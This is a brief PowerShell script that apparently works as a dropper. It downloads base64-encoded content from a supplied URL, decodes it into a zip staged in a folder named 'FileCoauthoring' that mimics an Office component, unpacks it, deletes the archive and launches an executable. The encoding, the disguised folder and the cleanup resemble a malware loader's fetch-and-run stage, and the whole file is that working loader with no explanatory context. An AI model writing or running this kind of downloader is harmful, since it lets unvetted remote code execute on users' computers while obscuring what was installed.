param (
    [string]$url,
    [string]$zipName,
    [string]$exeName
)

$response = Invoke-WebRequest -Uri $url -UseBasicParsing
$base64Content = $response.Content
$bytes = [Convert]::FromBase64String($base64Content)
$directoryPath = "$env:LOCALAPPDATA\FileCoauthoring"
$zipFileName = "$directoryPath\$zipName"
Write-Output $zipFileName

if (-not (Test-Path $directoryPath)) {
    New-Item -ItemType Directory -Path $directoryPath -Force
}

[System.IO.File]::WriteAllBytes($zipFileName, $bytes)
Expand-Archive -LiteralPath $zipFileName -DestinationPath $pwd -Force
Remove-Item -Path $zipFileName
Start-Process -FilePath "$pwd\$exeName"
